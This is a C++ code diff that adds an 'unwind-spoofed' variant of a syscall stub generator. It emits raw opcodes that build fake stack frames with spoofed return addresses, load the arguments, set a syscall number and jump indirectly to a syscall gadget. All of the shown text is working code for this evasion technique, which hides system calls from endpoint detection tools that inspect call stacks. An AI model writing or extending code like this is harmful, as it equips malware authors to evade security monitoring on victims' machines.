@@ -93,6 +93,29 @@ void write_stack_args(ByteWriter& writer) {
     }
 }
 
+void write_unwind_prologue(ByteWriter& writer) {
+    writer.write_bytes(kSubRspImm8Opcode);
+    writer.write_u8(static_cast<std::uint8_t>(kUnwindFrameSize));
+}
+
+void write_unwind_slots(ByteWriter& writer, const UnwindSpoofAddresses& addresses) {
+    for (std::size_t index = 0; index < kUnwindFrameCount; ++index) {
+        write_mov_rax(writer, addresses.frames[index]);
+        write_store_rax(writer, index * sizeof(std::uint64_t));
+    }
+}
+
+void write_unwind_args(ByteWriter& writer) {
+    for (std::size_t index = 0; index < kUnwindArgCount; ++index) {
+        writer.write_bytes(kLoadR10AtRspDisp32Opcode);
+        writer.write_u32(static_cast<std::uint32_t>(
+            kUnwindArgSourceOffset + index * sizeof(std::uint64_t)));
+        writer.write_bytes(kStoreR10AtRspDisp8Opcode);
+        writer.write_u8(static_cast<std::uint8_t>(
+            kUnwindArgOffset + index * sizeof(std::uint64_t)));
+    }
+}
+
 std::array<std::uint8_t, kDirectStubSize> assemble_direct(std::uint32_t ssn) {
     std::array<std::uint8_t, kDirectStubSize> stub{};
     ByteWriter writer(stub);
@@ -124,6 +147,20 @@ std::array<std::uint8_t, kSpoofStubSize> assemble_spoofed(
     write_stack_args(writer);
     write_syscall_prefix(writer, ssn);
     write_indirect_jump(writer, gadget_address);
+    return stub;
+}
+
+std::array<std::uint8_t, kUnwindStubSize> assemble_unwind_spoofed(
+    std::uint32_t ssn,
+    std::uint64_t syscall_gadget,
+    const UnwindSpoofAddresses& addresses) {
+    std::array<std::uint8_t, kUnwindStubSize> stub{};
+    ByteWriter writer(stub);
+    write_unwind_prologue(writer);
+    write_unwind_slots(writer, addresses);
+    write_unwind_args(writer);
+    write_syscall_prefix(writer, ssn);
+    write_indirect_jump(writer, syscall_gadget);
     return stub;
 }
 
@@ -159,6 +196,19 @@ bool write_spoofed_stub(
         return false;
     }
     const auto stub = assemble_spoofed(ssn, gadget_address, addresses);
+    std::copy(stub.begin(), stub.end(), destination.begin());
+    return true;
+}
+
+bool write_unwind_spoofed_stub(
+    std::span<std::uint8_t> destination,
+    std::uint32_t ssn,
+    std::uint64_t syscall_gadget,
+    const UnwindSpoofAddresses& addresses) {
+    if (destination.size() < kUnwindStubSize) {
+        return false;
+    }
+    const auto stub = assemble_unwind_spoofed(ssn, syscall_gadget, addresses);
     std::copy(stub.begin(), stub.end(), destination.begin());
     return true;
 }
